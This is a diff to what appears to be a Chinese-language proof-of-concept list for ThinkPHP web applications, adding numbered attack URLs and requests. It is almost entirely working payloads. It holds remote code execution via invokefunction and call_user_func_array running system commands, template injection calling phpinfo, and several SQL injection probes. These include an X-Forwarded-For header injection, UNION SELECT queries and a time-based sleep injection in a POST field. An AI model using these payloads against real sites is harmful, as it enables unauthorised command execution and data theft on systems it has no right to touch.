@@ -21,4 +21,23 @@ POC：</br>
 13、http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd</br>
 14、http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1</br>
 15、http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd</br>
-16、http://url/to/index.php/module/action/param1/${@phpinfo()}
+# 未知版本</br>
+16、?s=index/\think\module/action/param1/${@phpinfo()}</br>
+17、?s=index/\think\Module/Action/Param/${@phpinfo()}</br>
+18、?s=index/\think/module/aciton/param1/${@print(THINK_VERSION)}</br>
+19、index.php?s=/home/article/view_recent/name/1' </br>
+    header = "X-Forwarded-For:1') and extractvalue(1, concat(0x5c,(select md5(233))))#"</br>
+20、index.php?s=/home/shopcart/getPricetotal/tag/1%27</br>
+21、index.php?s=/home/shopcart/getpriceNum/id/1%27</br>
+22、index.php?s=/home/user/cut/id/1%27</br>
+23、index.php?s=/home/service/index/id/1%27</br>
+24、index.php?s=/home/pay/chongzhi/orderid/1%27</br>
+25、index.php?s=/home/pay/index/orderid/1%27</br>
+26、index.php?s=/home/order/complete/id/1%27</br>
+27、index.php?s=/home/order/complete/id/1%27</br>
+28、index.php?s=/home/order/detail/id/1%27</br>
+29、index.php?s=/home/order/cancel/id/1%27</br>
+30、index.php?s=/home/pay/index/orderid/1%27)%20UNION%20ALL%20SELECT%20md5(233)--+</br>
+31、POST /index.php?s=/home/user/checkcode/ HTTP/1.1</br>
+    Content-Disposition: form-data; name="couponid"</br>
+    1') union select sleep('''+str(sleep_time)+''')#</br>
